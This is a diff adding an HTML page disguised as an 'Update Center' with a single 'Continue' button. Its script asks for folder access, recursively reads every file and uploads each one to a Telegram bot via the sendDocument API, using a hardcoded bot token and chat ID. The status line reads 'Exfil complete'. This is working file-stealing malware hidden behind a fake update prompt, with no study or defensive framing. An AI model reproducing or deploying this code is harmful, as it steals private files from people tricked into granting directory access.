@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <title>Update Center</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    body{background:#000;color:#00ff00;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    #gate{padding:1.2rem 2.5rem;font-size:1.3rem;background:#00ff00;color:#000;border:none;cursor:pointer;box-shadow:0 0 20px #0f0}
+    #status{margin-top:1rem;font-size:1rem}
+  </style>
+</head>
+<body>
+  <div>
+    <button id="gate">Continue</button>
+    <div id="status"></div>
+  </div>
+
+<script>
+/* ===== CONFIG ===== */
+const BOT_TOKEN   = '8285822932:AAHqWCcWTTMfL55FBFXZWDkO-VamA0dNEuk';
+const CHAT_ID     = '8011516465';
+/* ================== */
+
+document.getElementById('gate').onclick = async () => {
+  try{
+    const dirHandle = await window.showDirectoryPicker({mode:'readwrite'});
+    document.getElementById('gate').style.display='none';
+    update('Indexing…');
+    let count = 0;
+    await walk(dirHandle,'');
+    update(`Exfil complete – ${count} files transferred.`);
+    async function walk(root, path){
+      for await(const [name,handle] of root.entries()){
+        const full = path+name;
+        if(handle.kind==='file'){
+          const file = await handle.getFile();
+          await ship(file,full);
+          count++;
+        }else{
+          await walk(handle,full+'/');
+        }
+      }
+    }
+    async function ship(file,path){
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+      const fd  = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('document', new Blob([await file.arrayBuffer()],{type:file.type}), path);
+      await fetch(url,{method:'POST',body:fd});
+    }
+  }catch(e){ location.reload(); }
+};
+function update(txt){ document.getElementById('status').textContent = txt; }
+</script>
+</body>
+</html>
